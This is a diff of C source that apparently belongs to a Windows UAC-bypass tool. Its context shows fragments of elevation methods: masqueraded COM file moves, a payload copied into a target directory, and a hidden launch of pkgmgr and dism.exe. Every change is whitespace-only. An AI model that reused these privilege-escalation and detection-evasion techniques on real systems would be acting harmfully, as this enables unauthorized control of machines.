@@ -298,7 +298,7 @@ NTSTATUS ucmSXSMethod(
         _strcat(lpSxsPath, szDst);
         if (!ucmMasqueradedCreateSubDirectoryCOM(lpSxsPath, lpszDirectoryName))
             break;
-      
+
         _strcat(lpSxsPath, TEXT("\\"));
         _strcat(lpSxsPath, lpszDirectoryName);
 
@@ -322,7 +322,7 @@ NTSTATUS ucmSXSMethod(
         SetCurrentDirectory(szCurDir);
 
         //
-        // Consent workaround end. 
+        // Consent workaround end.
         // Restore real directory name.
         //
         if (bConsentItself) {
@@ -354,10 +354,10 @@ NTSTATUS ucmSXSMethod(
             _strcat(szDst, lpTargetApplication);
         }
 
-        if (supRunProcess2(szDst, 
-            NULL, 
-            NULL, 
-            SW_SHOWNORMAL, 
+        if (supRunProcess2(szDst,
+            NULL,
+            NULL,
+            SW_SHOWNORMAL,
             1000))
         {
             MethodResult = STATUS_SUCCESS;
@@ -398,8 +398,8 @@ BOOL ucmSXSMethodCleanup(
 * Purpose:
 *
 * Build parameters to the pkgmgr and force it to start dism.exe.
-* 
-* Note: 
+*
+* Note:
 * Name is a very original WD behavior signature name.
 *
 */
@@ -416,11 +416,11 @@ NTSTATUS ucmxDisemer()
     _strcat(szParameters, MYSTERIOUSCUTETHING);
     _strcat(szParameters, TEXT(" /quiet"));
 
-    if (supRunProcess2(szApplication, 
-        szParameters, 
-        NULL, 
-        SW_HIDE, 
-        SUPRUNPROCESS_TIMEOUT_DEFAULT)) 
+    if (supRunProcess2(szApplication,
+        szParameters,
+        NULL,
+        SW_HIDE,
+        SUPRUNPROCESS_TIMEOUT_DEFAULT))
     {
         return STATUS_SUCCESS;
     }
@@ -478,7 +478,7 @@ NTSTATUS ucmDismMethod(
     WCHAR   szSource[MAX_PATH * 2];
 
     cNames = (g_ctx->dwBuildNumber < NT_WIN10_20H1) ? 1 : DISM_DLL_NAMES;
-    
+
     for (i = 0; i < cNames; i++) {
 
         MethodResult = ucmGenericAutoelevation(NULL,
@@ -624,7 +624,7 @@ NTSTATUS ucmUiAccessMethod(
 
         //
         // Copy Fubuki to target directory.
-        // 
+        //
         if (!ucmMasqueradedMoveFileCOM(szSource, szTarget))
             break;
 
